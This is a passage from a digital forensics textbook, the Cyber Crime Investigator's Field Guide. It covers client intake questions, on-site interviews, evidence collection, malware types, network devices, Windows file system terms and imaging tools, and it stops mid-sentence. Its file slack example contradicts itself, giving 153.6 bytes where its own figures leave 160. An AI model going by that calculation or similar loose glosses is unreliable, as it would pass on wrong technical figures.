![](images/cover.jpg)

![Cover: Cyber Crime Investigator’s Field Guide, Edited by Bruce Middleton, published by CRC Press is an imprint of Taylor & Francis Group, LLC](images/cover.jpg)

Third edition published 2022  
by CRC Press  
6000 Broken Sound Parkway NW, Suite 300, Boca Raton, FL 33487-2742

and by CRC Press  
4 Park Square, Milton Park, Abingdon, Oxon, OX14 4RN

*CRC Press is an imprint of Taylor & Francis Group, LLC*

© 2022 Bruce Middleton

First edition published by Auerbach Publications, 2001  
Second edition published by Auerbach Publications, 2005

Reasonable efforts have been made to publish reliable data and information, but the author and publisher cannot assume responsibility for the validity of all materials or the consequences of their use. The authors and publishers have attempted to trace the copyright holders of all material reproduced in this publication and apologize to copyright holders if permission to publish in this form has not been obtained. If any copyright material has not been acknowledged please write and let us know so we may rectify in any future reprint.

Except as permitted under U.S. Copyright Law, no part of this book may be reprinted, reproduced, transmitted, or utilized in any form by any electronic, mechanical, or other means, now known or hereafter invented, including photocopying, microfilming, and recording, or in any information storage or retrieval system, without written permission from the publishers.

For permission to photocopy or use material electronically from this work, access [www.copyright.com](http://www.copyright.com) or contact the Copyright Clearance Center, Inc. (CCC), 222 Rosewood Drive, Danvers, MA 01923, 978-750-8400. For works that are not available on CCC please contact [mpkbookspermissions@tandf.co.uk](http://mpkbookspermissions@tandf.co.uk)

*Trademark notice*: Product or corporate names may be trademarks or registered trademarks and are used only for identification and explanation without intent to infringe.

ISBN: 9780367682309 (hbk)  
ISBN: 9781032301891 (pbk)  
ISBN: 9781003134817 (ebk)

DOI: [10.1201/9781003134817](http://doi.org/10.1201/9781003134817)

Typeset in Sabon  
by Deanta Global Publishing Services, Chennai, India

I dedicate this book to my peers in the cyber security field. Your tireless dedication to the security of the global network infrastructure goes unnoticed by many but I (and many others, I’m sure) want to say thank you. Without you, our global computer communications network infrastructure would be in unimaginable chaos.

# Preface

In the past 50 years, growth in the area of data communications has been phenomenal, to say the least. During the Vietnam War, one of my duty stations was on an island in the China Sea. I was part of a signals intelligence group, intercepting and decoding wartime communications traffic. We did our best to decode and analyze the information we intercepted, but many times the help of a high-end (at that time) mainframe computer system was required. Did we have a communication network in place to upload the data to the mainframe, let the mainframe do the processing, and then download the data back to us? Not a chance. We had to take the large magnetic tapes and give them to pilots on an SR-71 Blackbird, who flew the tapes to the United States for processing on a mainframe computer system. Once the results were obtained, we would receive a telephone call informing us of any critical information that had been found. It is hard to believe now that 50 years ago that was the way things were done.

Fast forward to today. Data networks now in place allow us to transmit information to and from virtually any location on Earth (and to spacecraft in outer space) in a timely and efficient manner. But what has this tremendous enhancement in communications technology brought us? – Another opportunity for criminal activity to take place. Who are the criminals in cyberspace? One group to start with is organized crime, such as the Mafia and others. What is their major focus? Financial activity, of course. They have found a new way to “mismanage” the financial resources (among other things) of others. Persons involved in foreign espionage activities also make use of our enhanced communication systems. They routinely break into government, military, and commercial computer networked systems and steal trade secrets, new designs, new formulas, etc. Even the data on your personal home computer is not safe. If you are like many in the world today, you work from home. You also may handle your personal finances on your home computer. By doing so, both your personal data and your employer’s data could easily be at risk and fall into the hands of those who prey on secured and unsecured computer systems. I could go on, but I am sure you get the picture.

Why does this happen? We cannot make these communication systems fully secure. Why not? Think about it. Banks and homes and businesses have been in existence for as long as we can remember. Despite all the security precautions put in place for banks, homes, aircraft, and businesses, we have not been able to fully secure them. There are still bank robberies, aircraft hijackings, and break-ins at businesses and homes on a regular basis. Almost nothing in the physical world is really secure. If various entities (governments, militaries, malicious individuals, NGOs, etc.) want to focus on or target something, more than likely they will obtain what they want – if they have the time, patience, and other sufficient resources behind them. We should not expect cyberspace to be any different. Just as in the physical world, where we have to be constantly alert and on guard against attacks on our government, military, corporations, and homes, we have to be alert in cyberspace. Why? Because people can now come into your home, your business, or secure government and military bases without being physically seen. They can wreak havoc, changing your formulas, changing your designs, altering your financial data, and obtaining copies of documents, all without you ever knowing they had been there. The explosion of newer technologies such as devices embedded in our clothing and in the products we purchase, IoT (Internet of Things) devices, enhanced vehicle electronics, robotics, 5G, and Transhumanism will all (and some already do) have a significant effect on cyber forensics investigations.

This brings us to the fact that we need to keep doing the same things we have been doing for many years in the realm of physical security. Do not let your guard down. But it also means that we must continue to enhance our security in the cyber realm. Many excellent products (hardware and software) have been developed to protect our data communication systems. These products must be further enhanced. Many new and enhanced laws over the past 30 years have provided law enforcement with more teeth to take a bite out of cybercrime. Also needed are those who know how to investigate computer network security incidents – those who have both investigative talents and a technical knowledge of how cyberspace really works. That is what this book is about, to provide the investigative framework that should be followed, along with a knowledge of how cyberspace works and the tools available to investigate cybercrime – the tools to tell the who, where, what, when, why, and how.

# About the author

**Bruce Middleton**, CISSP, CEH, NSA IAM, and PMP, is a graduate from the University of Houston (BSEET), Texas, and holds MBA from DeVry University, Naperville, Illinois.

Bruce has over 25 years of experience in the design and security of data communications networks. He began his career with the National Security Agency (NSA) while serving in the United States Army. He has worked on a number of extremely interesting projects for the intelligence community, Department of Defense, and other federal government agencies over the past three decades while working with government contractors such as Boeing, United Technologies, BAE Systems, Harris, and General Dynamics. Bruce was also a key player in the design/security of the communication system for NASA’s International Space Station and a registered private detective in the state of Virginia.

Bruce is an international speaker on computer crime and has authored numerous articles for *Security Management* magazine and is a member of the FBI’s InfraGard program. His latest venture for the past five years has been in the rail transportation industry with a global rail powerhouse named Alstom (Alstom.com), a French company headquartered in Paris, France, where Bruce served as the North American Regional Cyber Security Manager.

# Chapter 1 The initial contact

DOI: [10.1201/9781003134817-1](https://doi.org/10.1201/9781003134817-1)

When you are first contacted by a client, whether it be in person, over the telephone, or via e-mail, before you plunge headlong into the new case, some specific questions require answers up front. The answers to these questions will help you to be much better prepared when you actually arrive at the client’s site to collect evidence and interview personnel. Also remember that the cases you may be involved with vary tremendously. A short listing of case types would include:

*   Web page defacement
*   Hospital patient databases maliciously altered
*   Engineering design databases maliciously altered
*   Murder
*   Alibis
*   Espionage/Sabotage
*   Trade secret theft
*   Stolen corporate marketing plans
*   Computer network used as a jump-off point to attack other networks
*   Computer-controlled building environmental controls maliciously modified
*   Stolen corporate bid and proposal information
*   Military weapons systems altered
*   Satellite communication system takeover

Because so many different types of cases exist, review the questions listed below and choose those that apply to your situation. Ignore those that do not apply. Also, depending on your situation, think about the order in which you ask the questions. Note that your client may or may not know the answers to certain questions. Even if the client does not know the answers, these questions begin the thinking process for both you and the client. Add additional questions as you see fit, but keep in mind that this should be a short discussion: its purpose is to help you be better prepared when you arrive at the client’s site, not to have the answers to every question you can think of at this time. Ensure that the communication medium you are using is secure regarding the client and the information you are collecting, i.e., should you use encrypted e-mail? Should you use an STE (Secure Terminal Equipment; replaced the earlier STU III) or other pieces of communications equipment that allow secure voice and data communication (such as encryption) using SCIP (Secure Communications Interoperability Protocol), etc.? Questions you should ask (and these can vary depending on what country you are working in and the technologies they have in use) and requests that you may need to make of the client include:

*   Do you have an IDS (Intrusion Detection System) and/or an IPS (Intrusion Prevention System) in place? If so, which vendor?
*   Who first noticed the incident?
*   Is the attacker still online?
*   Are there any suspects?
*   Are security policies/procedures in place?
*   Have there been any contacts with ISPs (Internet Service Providers) and LEOs (law enforcement organizations)?
*   Why do you think there was a break-in?
*   How old is the equipment?
*   Can you quickly provide me with an electronic copy of your network architecture over a secure medium?
*   What operating systems are utilized at your facility?
*   Are the drives FAT, NTFS, or …?
*   What type of hardware platforms is utilized at your facility (Intel, Sparc, RISC \[Reduced Instruction Set Computer\], etc.)?
*   Do the compromised systems have CD-ROM drives, diskette drives, etc.?
*   Are these systems classified or is the area I will be in classified? At what level? Where do I fax my clearance?
*   What sizes are the hard drives on the compromised systems? SSD in use?
*   Will the system administrator be available when I arrive, along with any other experts you may have for the compromised system (platform level, operating system level, critical applications running on the system)?
*   What type of information did the compromised system hold? Is this information crucial to your business?
*   Will one of your network infrastructure experts be at my disposal when I arrive on site (personnel who know the organization’s network – routers, hubs, switches, firewalls, etc.)?
*   Have your physical security personnel secured the area surrounding the compromised systems so that no one enters the area? If not, please do so.
*   Does the crime scene area forbid or preclude the use of electronic communication devices such as cellular telephones, pagers, etc.?
*   Please have a copy of the system backup tapes for the past 30 days available for me.
*   Please put together a list of all the personnel involved with the compromised system and any projects the system is involved with.
*   Please check your system logs. When I arrive, have a listing that shows who accessed the compromised system in the past 24 hours.
*   Do the compromised systems have SCSI (Small Computer Systems Interface) or parallel ports (or both) or something else?
*   Please do not touch anything. Do not turn off any systems or power, etc.
*   What are the names of hotels close by where I can stay?
*   My expected arrival time is 6 pm. Will there be a cafeteria open so I can obtain something to eat?
*   Please do not mention the incident to anyone who does not absolutely need to know.

## Chapter questions

*   1\. List five different case types.
*   2\. List eight questions you should have answers to before you arrive at the client site.
*   3\. Can the order in which you ask questions be important?
*   4\. What are the two major reasons for putting together a list of pertinent questions and obtaining answers?

# Chapter 2 Client site arrival

DOI: [10.1201/9781003134817-2](https://doi.org/10.1201/9781003134817-2)

On the way to the client’s site (whether by car, train, or aircraft), do not waste time. Focus on reviewing the answers the client gave to the questions in [Chapter 1](#c1.xhtml#c1). If you were able to obtain it, review the network topology diagram that was sent to you. Discuss with your team members (if you are operating as part of a team) various approaches to the problem at hand. Know what your plan of attack is going to be by the time you arrive on site at the client’s premises. If you are part of a team, remember that only one person is in charge. Everyone on the team must completely support the team leader at the client’s site.

The first thing to do at the client’s site is to go through a pre-briefing. This is about a 15-minute period in which you interface with the client and the personnel the client has gathered to help in your investigation, giving you the opportunity to ask some additional questions, meet key personnel you will be working with (managers, system administrators, key project personnel who used the compromised system, security personnel, etc.), and obtain an update on the situation (something new might have occurred while you were en route). Do not spend much time here; begin the evidence collection process as quickly as possible.

Once again, a variety of questions should be asked. Depending on the case, you will choose to ask some of the questions and ignore others. Again, also consider the order of the questions. These questions should also help generate some other questions. When the questions refer to “personnel,” the reference is to those who (in some way, shape, or form) had access to the compromised system(s). Some of the questions can be asked to the entire pre-briefing group, whereas others may need to be asked privately. Use discretion and tact. Again, remember that you can ask questions now, but someone may have to go find the answers and report back to you. Relevant questions include:

*   Was it normal for these persons to have been on the system during the past 24 hours?
*   Who was the last person on the system?
*   Does this person normally work these hours?
*   Do any of your personnel have a habit of working on weekends, arriving very early, or staying very late?
*   What are the work patterns of these personnel?
*   At what time(s) did the incident occur?
*   What was on the computer screen?
*   When was the system last backed up?
*   How long have these individuals been with the organization?
*   Have any of these individuals behaved in a strange manner? Do any have unusual habits or an adverse relationship with other employees?
*   Have there been any other unusual network occurrences during the past 30 days?
*   Can you provide me with an overview of what has happened here?
*   What programs/contracts were the compromised systems involved with? What personnel work on these programs/contracts?
*   Is there anything different about the area where the systems reside? Does anything look out of place?
*   What level of access (clearance) does each of the individuals have for the compromised system and the area where it resides?
*   Are any of the personnel associated with the systems not <your country> citizens?
*   Could any cameras or microphones in the area track personnel movements at or near the compromised system area?
*   Are there access logs into/out of the building and area?
*   Do people share passwords or user IDs?
*   Does the organization have any financial problems or critical schedule slippages?
*   Have any personnel taken extended vacations, had unexplained absences, or visited foreign countries for business/pleasure during the past 90 days?
*   Are there associated personnel who have NOT taken a vacation for the past year or more?
*   Have any personnel been reprimanded in the past for system abuse or any other issues?
*   Are any personnel having financial or marital hardships? Are any having intimate relations with any fellow employee or contractor?
*   Are any personnel contractors, part-time, or not full-time employees?
*   Has anyone had access to the building, systems, area over the past 60 days who usually does not have access (first timers, sales meeting, service personnel, others from the outside not usually present)?
*   Which janitorial service do you use? Have the personnel been properly vetted?
*   Who else had access to the area that was compromised?
*   What are the educational levels and computer expertise levels of each of the personnel involved with the system?
*   What type of work is this organization involved with (current and past)?
*   Who first noticed the incident? Who first reported the incident? When?
*   Did the person who noticed the incident touch anything besides the telephone?
*   Does anyone else in the company know of this?
*   Based on physical security records, what time did each of the personnel arrive in the building today?
*   Based on records from physical security, if any personnel arrived early, was anyone else already in the building? Was this normal for them?
*   What are logs showing for remote access? Anything unusual over the past 60 days?
*   For the past 30 days, provide me with a listing of everyone who was on the compromised system, along with their dates/times of access.
*   What was the purpose of that specific system?
*   Has the employment of anyone in the organization been terminated during the past 90 days?
*   Can you give me a copy of the organization’s security policy/procedures?
*   Why do you think there was a break-in? (Try to get people to talk.)
*   Can you provide any records available for the compromised system, such as purchasing records (see original configuration of box) and service records (modifications, problems the box had, etc.)?
*   Can you provide a diagram of the network architecture? (This question is necessary only if you have not already obtained one.)
*   Are all experts associated with the system present? (Obtain their names and contact information.)
*   Briefly spell out the evidence collection procedure you (as the investigator) will be following to those in the pre-briefing.
*   Have you (the investigator) received the backups requested for the compromised system? If not, are backups done on a regularly scheduled basis?
*   Was the system serviced recently? By whom?
*   Were any new applications recently added to the compromised systems?
*   Were any patches, updates, or operating system upgrades recently done on the compromised system?
*   Were any suspicious personnel in the area of the compromised systems during the past 30 days?
*   Were any abnormal access rights given to any personnel in the past 90 days who are not normally associated with the system?
*   Are there any known disgruntled employees, contractors, etc.?
*   Were any new contractors, employees, etc. hired in the past month?
*   Are there any human resources, union, or specific organizational policies or regulations that I (we) need to abide by while conducting this investigation?

## Chapter questions

*   1\. What should you be doing as you travel to the client site?
*   2\. If you are part of a team, remember that there is only \_\_\_\_\_\_ person in charge. Everyone on the team must completely support the \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ at the client site.
*   3\. What is the first thing you should do when you arrive at the client site?
*   4\. List three questions that you should ask at a pre-briefing.

# Chapter 3 Evidence collection procedures

DOI: [10.1201/9781003134817-3](https://doi.org/10.1201/9781003134817-3)

[Chapter 3](#c3.xhtml#c3) discusses evidence collection tools and covers the procedures involved with collecting evidence so that the evidence will usually be admissible in a court of law. Keep in mind as you read through this chapter that there will always come new tools and technologies. Also keep in mind that technology you consider current in your particular country could be unavailable in other less-developed or economically challenged countries, and as such you may be forced to work with hardware and software tools less advanced than what you are used to. The important thing is that you understand the concepts involved and don’t tie yourself and your career to only the latest and greatest toolsets and computer systems available. Be able to adjust to whatever is at hand for you to make use of. The answers to the following questions illustrate key details of the procedures:

*   What is Locard’s Exchange Principle?  
    Anyone, or anything, entering a crime scene takes something of the crime scene with them. They also leave behind something of themselves when they depart.
*   To what website should you go to read computer search and seizure guidelines that are accepted in a court of law?  
    [https://www.justice.gov/sites/default/files/criminal-cips/legacy/2015/01/14/ssmanual2009.pdf](https://www.justice.gov) (Read this information completely and carefully – Know the 4th Amendment to the US Constitution.)
*   The six investigative techniques, in order, used by the Federal Bureau of Investigation (FBI): 
    1.  Check records, logs, and documentation.
    2.  Interview personnel.
    3.  Conduct surveillance.
    4.  Prepare search warrant.
    5.  Search the suspect’s premises if necessary.
    6.  Seize evidence if necessary.
*   You are at the crime scene with a system expert and a network infrastructure specialist. What should be your first steps? 
    1.  a. If allowed, photograph the crime scene. This includes the area in general, computer monitors, electronic instrument information from devices that are in the area (cellular telephones, pagers, etc.), and cabling connections (including under the floor if the floor is raised).
    2.  b. Make sketches as necessary.
    3.  c. If an active modem connection exists (flashing lights indicating communication in progress), quickly unplug it and obtain internal modem information via an rs-232 connection to your laptop. Is it normal for a modem to be here? If so, is it normal for it to be active at this time?
    4.  d. Lift ceiling tiles and look around.
*   What are the six steps, in order, that a computer crime investigator would normally follow? 
    1.  a. Secure the crime scene (if the attacker is still online, initiate back trace). A back trace (also called a traceback) is an attempt to obtain the geographical location(s) of the attacker(s) using specialized software tools.
    2.  b. Collect evidence and maintain chain of custody (assume it will go to court)
    3.  c. Interview witnesses.
    4.  d. Plant sniffers (if no IDS/IPS/SIEM is in place).
    5.  e. Obtain laboratory analysis of collected evidence.
    6.  f. Turn findings and recommendations over to the proper authority.
*   What tools could be used to obtain the bitstream backup/forensic image of the hard drive(s)? 
    *   DD (comes with UNIX/Linux operating systems)
    *   EnCase ([https://security.opentext.com/encase-forensic](https://security.opentext.com))
    *   AccessData FTK Imager ([https://accessdata.com/product-download](https://accessdata.com))
    *   Cellebrite Digital Collector ([https://www.cellebrite.com/en/digital-collector/](https://www.cellebrite.com))
    *   X-Ways Forensics ([https://www.x-ways.net/forensics/index-m.html](https://www.x-ways.net))
    *   Magnet Axiom ([https://www.magnetforensics.com/products/magnet-axiom/](https://www.magnetforensics.com))
    *   Magnet Ignite ([https://www.magnetforensics.com/products/magnet-ignite/](https://www.magnetforensics.com)) 
        *   – Fast Triage
    *   Paraben ([https://cart.paraben.com/DP2C-Data-Imaging\_p\_16.html](https://cart.paraben.com))
    *   Kali Linux
    *   Note that there are others but the list above will suffice

## You Are Now Sitting in Front of the victim’s system – What Should Your Approach Be?

You are sitting in front of a victim system at the client’s site. The system is still on, but the client removed the system from the network while you were en route to the site. Otherwise, the system has been left untouched since you were contacted. Observe that this is an Intel platform running Microsoft Windows 10. There is still no solid answer within the forensics community as to whether the power plug on a computer system should be disconnected in order to ensure the evidence remains in its current state or if the live system should remain active (there are risks both ways) as you found it when you arrived onsite. Leaving it on provides you with the ability to perform live memory analysis (such as with Volatility) but you risk the fact that something may be going on with the system at this time that is erasing valuable evidence on the hard drive or that some type of remote access (or USB access, etc.) may occur and as such you lose evidence or some adverse impact to the system occurs. On the other hand, if you happen to switch off a computer system that is running BitLocker then you have automatically activated BitLocker encryption. If the organization has the necessary code to disable the BitLocker encryption then that is not a problem, but you would want to know that prior to shutting down that system (in other words, if you suspect BitLocker may be active and you are NOT sure you have the code to unlock it, then DO NOT shut down the computer system yet). My personal preference is to pull the plug (some operating systems automatically place memory contents onto the hard drive when you do that but not all do) if BitLocker is not enabled, but as I said not everyone agrees with that approach. Depending on the situation and the environment, there are times when I prefer to pull the plug, quickly duplicate the hard drive twice (bitstream backup/forensic image), bring the system back up as if it had never been down with one of the duplicate hard drives, connect it back to the network, and see if a malicious actor attempts further access and track that. The original hard drive is stored in a safe and the other duplicate is used for your upcoming forensics analysis (proper chain of custody is a key item here for the original and duplicate hard drives if you plan to go to court, and you should always plan your moves as if you were going to court unless your client puts in writing that they do not want to go to court and you are to proceed in your endeavors as quickly as possible). Most of the clients I work with are not interested in going to court but just want to know the who, where, what, when, why, and how so that they can take the action they deem appropriate, so it depends on whom you are working with. That’s why it’s always best to have an established relationship with your clients prior to something going wrong. You want to understand and know how your clients think, so market yourself and your company so you have these established relationships in place where possible. Even if it’s a new client it’s quite possible that one or more of your established relationships will be known by your new client, and this helps ease into the work since your new client will then already have some knowledge of how you are used to working and a certain trust level is readily established.

## Let’s step back for a minute and look at the big network picture

Now let’s think about just where all the evidence you need to collect actually resides. It’s not just in the computer system you are looking at. That computer was connected to some type of network infrastructure, and various devices on that network will likely contain some information of interest to you. As a forensics professional, you need to have at least a high-level knowledge of forensics terminology, network architecture (hardware and software), what malicious activities can be performed against this architecture, and the deeper you can go, the better. Let’s give you that high-level knowledge now (or review it if you already know it).

## Malware

Malware is essentially software that is specifically designed to infiltrate a computer network and most likely damage it without the network owner’s knowledge and/or consent. Malware can take several forms:

### Virus

A virus is malicious code that runs on a computer (or other network devices, depending on its purpose) without the owner’s knowledge and this code infects the network device when it is executed. Note that a virus requires the end user of the computer system to take some action in order for the virus to reproduce and spread. There are various virus types:

#### Encrypted

A computer virus that encrypts its payload with the intent of making detection more difficult.

#### Program

This type of virus infects either an application or some type of executable file.

#### Boot sector

Stored in the first sector of a hard drive and subsequently loaded into memory (RAM) when the computer is booted up.

#### Multipartite

This type of virus will attach itself to both the boot sector and system files and then move to infiltrate other files on the computer system.

#### Macro

Here the virus has been embedded into a document of some type (a Microsoft Excel or Word file, for example) and the virus is executed when the document is opened by the end user.

#### Stealth

A hidden virus that attacks operating system processes and prevents your typical antivirus scans. These viruses take refuge in partitions, files, and boot sectors and are proficient at intentionally avoiding detection by scanners.

#### Hoax

An email (for example) that warns of a non-existent virus and urges recipients to forward the warning message. Of course this ties up valuable network bandwidth when such false warnings “go viral.”

#### Polymorphic

This is an enhancement to the standard encrypted virus. To avoid detection, it morphs itself each time it is executed by changing the decryption module.

#### Armored

This virus can be said to have a “protection layer” surrounding it so as to confuse analysis by an individual or program attempting to learn about how it works.

#### Metamorphic

This is an enhancement to the standard polymorphic virus. It has the ability to completely rewrite itself prior to infecting files.

#### Worm

Similar to a virus but it can self-replicate (no user interaction is required) and be quite disruptive. An example would be the Conficker Worm which infected millions of computers.

#### Trojan horse

Software that seems to be doing something you want but in truth it is malicious and performing background activities of which you are unaware. The most common Trojan is a RAT (Remote Access Trojan) whose purpose is to provide the malicious actor with remote control of your computer system without your knowledge or consent.

#### Ransomware

Becoming more and more popular and dangerous (has severely impacted hospitals, transportation systems, schools, governments, and others. SamSam in 2018 has cost the city of Atlanta, Georgia, at least US$ 15 million dollars since they refused to pay the ransom.). This malware prevents the system owner from accessing their data until some monetary payment is made (usually via bitcoin). Even if you pay the ransom there is no guarantee that your data will be released back to you, or that it won’t attack another computer on your network after the first payment is made. It’s also possible that any payment you make could be illegal if it turns out you are funding some terrorist group or some other malicious entity on an FBI government watchlist, and you could be fined or jailed for such payment. Essentially, this attack is taking advantage of a vulnerability in some software package you are using in order to gain access to your system and subsequently encrypt your data. The best protection from this type of attack is to always keep recent backups of your computer system.

#### Spyware

Covertly gathers information about the user/system without the end user’s knowledge or consent. Keyloggers are a good example in that they capture the victim’s keystrokes as he types and can also take screenshots of your computer and sends them back to the attacker. Adware is another type of spyware that learns about your web activities and then targets advertisements to you so that you will buy products (sometimes categorized as “grayware”).

#### Rootkit

This is some of the most dangerous and it targets the kernel or boot loader of a computer system. It is designed to hide itself and to obtain administrative level control of your computer system without being detected. Thus, someone else controls your computer system and it’s not picked up by standard antivirus scans. It is common to find DLL injection (malicious code is pushed into a running Microsoft Windows process by making use of Dynamic Link Libraries that are loaded up at runtime) being used by a rootkit so that it can persist across computer reboots. Device drivers can also be at risk here for malicious usage.

#### Spam

Everyone knows what this is and how annoying it can be. Its most common delivery medium is via email. Spammers will often exploit an open mail relay in order to send their messages in bulk. In effect it’s an abuse mechanism.

## Terminology

We also need to know some of the common terminology used relative to attacks on network systems:

*   Attack vector 
    *   This is the technique that a malicious actor uses to gain access to a targeted computer system so that he can infect it with some type of malware.
    *   Backdoor
    *   These can be put in place either by a malicious actor or they could have been put in place by a programmer who coded the legitimate product you are using. In either case, a backdoor is a covert way to access portions of a program that would not normally be accessed so that normal in-place system security is bypassed.
    *   Botnet
    *   A group of compromised computers (usually unknown to the system owners) under the control of some malicious actor via some master computer system (node). These compromised computers can be called Zombies. DDoS (Distributed Denial of Service) attacks are usually launched via Botnet.
    *   Logic bomb
    *   Code that a malicious actor places inside a program but this portion of the code only executes and does its dirty deed when certain conditions are met.
    *   Privilege escalation
    *   Malicious actor exploits a hardware/software design flaw (or purposely created backdoor they learn of, or some other bug) in a system in order to gain access to system resources that typical end users do not have access to.
    *   Threat vector
    *   This is the technique that an attacker uses to maliciously access a computer system.
    *   Watering hole
    *   Malicious software is pushed to a website that via some reconnaissance a malicious actor knows his target normally goes to on a regular basis.

## Infection warning signs

What sort of things might an end user observe if their computer system has been somehow infected? Note that they might notice nothing but here are some items to watch for:

*   Mouse cursor begins moving around on its own
*   Running much slower than usual
*   You attempt to use the System Restore function for some reason but it does not work
*   Blank screens
*   Double file extensions are observed, such as filename.txt.exe
*   Software applications begin opening up when the end user did not act to make that occur
*   Strange activity that the end user does not usually see
*   Unusual error messages that are not normally observed
*   Loss of access to some applications, files, or hard drives
*   Some folders or files or drives are missing or corrupted in some fashion
*   Noises occur from the computer that the end user is not used to hearing
*   Printing is not done properly
*   New files and/or folders are showing up on the computer that the end user did not create (check with your Admin of course in case he did it)

## Network devices

*   Data Loss Prevention (DLP) 
    *   A DLP device performs real-time monitoring of data at rest, data in transit, and data in use in order to detect attempts to steal said data. There are both hardware and software DLP solutions. A Network DLP System can either be a hardware or software-based solution that is placed at the network perimeter to perform data in transit detection. A Cloud DLP system is SaaS (Software as a Service) that is guarding the data that is being stored in a cloud environment. An Endpoint DLP System is a software-based client whose purpose is to monitor the data in use on a computer system and it can prevent a file transfer and/or send an alert to someone (Admin, Data Owner, etc.) about the situation. A Storage DLP System is software that has been installed on datacenter (SOC, etc.) servers to perform an inspection of data at rest.
*   Firewall 
    *   Protects a system from undesired network traffic.
    *   Can be host based or network based.
    *   Can be software or hardware.
*   Intrusion Detection System (IDS) 
    *   This can be either a hardware device or a software application that is monitoring a particular system or an entire network. As network traffic enters it, data analysis occurs in real-time in order to ascertain whether or not the traffic is of a malicious nature. There are both HIDS (Host-Based IDS) and NIDS (Network-Based IDS). Note that an IDS can only produce an alert and log the suspicious activity. Remember that you can use these logs (and the logs of other devices attached to the network) to recreate events that occurred on the network after an attack has occurred (this helps you to understand what happened).
*   Intrusion Prevention System (IPS) 
    *   Quite similar to an IDS except the IPS can not only alert and log but also act on malicious network traffic such as an action to stop such traffic from proceeding any further into the network infrastructure.

## Microsoft Windows Operating Systems and file system types

*   Allocated storage space 
    *   This is the location on a drive volume where files are stored.
*   ASCII 
    *   American Standard Code for Information Interchange (ASCII) is a character encoding standard intended for electronic communication. ASCII codes denote text in computers, telecommunications equipment, and various other devices.
*   Bad sector 
    *   This is a location on the disk that is no longer able to store data. There are numerous things that can cause this to occur.
*   Bit 
    *   A bit can only be a zero (0 = negative charge) or a one (1 = positive charge).
*   Bitstream backup 
    *   Also called a Forensic Image. Every bit on the hard drive is captured via this process (specific tools are used for this).
*   Byte 
    *   Composed of 8 bits. Nowadays this is usually considered the smallest addressable memory unit but there are some older computer systems that have a 4-bit addressable memory unit and depending on what country/environment you are working in, you may come across them. Additionally, some individuals who delve into electronics in this arena use ICs (Integrated Circuits) that use 4 bits and if these devices are connected to a computer you wish to examine then you need to take this into consideration during your analysis.
*   Cluster 
    *   This is a logical storage unit on a disk that comprises contiguous sectors.
*   FAT12 
    *   Not encrypted.
    *   Metadata is less valuable when compared to an NTFS file system.
*   File extension 
    *   This is the set of letters that follow the “dot” in a complete file name. For example, a modern Microsoft Excel filename might be account-1.xlsx, where the file extension is the “xlsx.” This can be deceiving though, because a malicious actor might want to place a false file extension on a filename to lead you to believe it is an Excel file when it is really an executable (.exe) file. In reality, it is the file header that tells you what type of file you are really examining. Note that Microsoft File Explorer may not even display the file if the file extension does not match with what the file header shows to be the true file type.
*   File slack 
    *   If the size of a file is 2400 bytes (2.4 kilobytes = 2.4 KB) and your sector size is 512 bytes, then it would take 5 of those sectors (2400 bytes/512 bytes = 4.7 which would be rounded up to 5.0) to hold the entire 2400-byte file. That leaves 153.6 bytes (5.0 – 4.7 = 0.3 => 0.3 × 512 = 153.6 bytes) and this 153.6 bytes is what is called file slack. So, the file slack is the residual unused bytes in the last sector of a cluster. File slack is important because data can be hidden here. Here the logical size of the file is 2400 bytes (what you see in Microsoft’s File Explorer) but the physical size of the file is 2560 bytes (512 × 5, i.e., 5 sectors of 512 bytes per sector comes to 2560 bytes total).
*   Hiberfil.sys 
    *   Comprises a replica of the contents of Random Access Memory (RAM) and is saved to the hard drive if the computer is placed in hibernate mode. When the computer is booted up, Hiberfil.sys contents are loaded back into RAM memory.
*   NTFS 
    *   Potentially strong encryption.
*   Operating system 
    *   Programs whose purpose is to control/manage computer hardware and associated system resources.
*   Pagefile.sys 
    *   Holds data frames that were swapped from RAM to the hard disk. Potentially there will be a lot of interesting information here for you to analyze. A paging file is essentially an area on the hard disk that Microsoft Windows makes use of as if it were RAM.
*   Partition 
    *   A logical storage area.
*   Prefetch files 
    *   These files comprise information pertaining to an application, such as the number of times it has been run, when it was run. The stated purpose of Prefetch by Microsoft is that it will enhance the application startup process performance but from the viewpoint of a forensics investigator, Prefetch files can be examined to ascertain which applications have been run and exactly when they had been run. Such information can discover programs that were installed and run by the system owner and/or Admin for the sole purpose of removing incriminating evidence.
*   RAM 
    *   Random Access Memory.
*   Registry 
    *   Records configuration changes to a system.
*   Sector 
    *   On a magnetic hard disk sectors can be of various sizes, such as 512 bytes, 2048 bytes, 4096 bytes, and other sizes.
*   Tracks 
    *   Picture a rubber band wrapped around a disk. This gives you some idea of what a track is like and it contains the sectors where data is stored.
*   Unallocated storage space (USS) 
    *   When you delete a file from a computer, it still physically exists on the drive volume but that storage space is now available to be overwritten by another file and of course USS can be used to create a new partition on a drive volume.
*   Unicode 
    *   An enhanced version of ASCII that is an international encoding standard supporting far more languages globally (among other things).

## Detailed procedures for obtaining a bitstream backup of a hard drive

Since some of you who are reading this book have an interest in working in forensics, and there are many tools out there, where should you focus your efforts from a tools perspective to enhance your opportunity for work in this arena? The following is a list of the nine significantly used forensics tools by major organizations both in the United States and globally:

1.  Kali Linux (Sleuth Kit, etc.)
2.  EnCase
3.  AccessData’s FTK
4.  X-Ways Forensics
5.  Paraben
6.  Cellebrite
7.  Magnet Axiom (and for triage, Ignite)
8.  Volatility
9.  DD (Linux/Unix)

### Kali Linux

Kali Linux can be used for both penetration testing and as a live-response forensic tool since it comprises numerous tools essential for full forensic investigations. When initially booting from a CD/DVD or flash drive, the forensic investigator has numerous selections to pick from, such as Live (forensic mode), leaving the evidence drive unchanged (auto-mounting of any other storage media is disabled), which subsequently affords integrity of our original evidence during the investigation. Note that in this mode Kali prevents the writing of data to the swap file (case significant data that was recently deposited in memory may likely be present in this file). The Kali Linux menu looks like this:

![](images/inline3.1.jpg)

The forensics section of Kali provides the following capabilities (there are also command line tools we can make use of in Kali), some of which we will discuss as we move forward in this book:

![](images/inline3.2.jpg)

I’ll also point out the fact that if you are concerned about your forensics work being accepted in a court of law in whatever country you are working in, then you need to follow the laboratory setup procedures stipulated by Interpol in this document: “Global Guidelines for Digital Forensics Laboratories.” There are other methodologies that are in use today in various countries that you can use, but as I stated above, if you want your work to be accepted in court in any country you are working in, then follow this Interpol document. On top of this, we need to be aware of the NIST (National Institute of Standards and Technology) CFTT (Computer Forensics Tool Testing) program. This globally public database provides you with test results of forensic tools, and if you are going into court you want to ensure that you are using tools that NIST gave positive results for. You can make use of this database at:

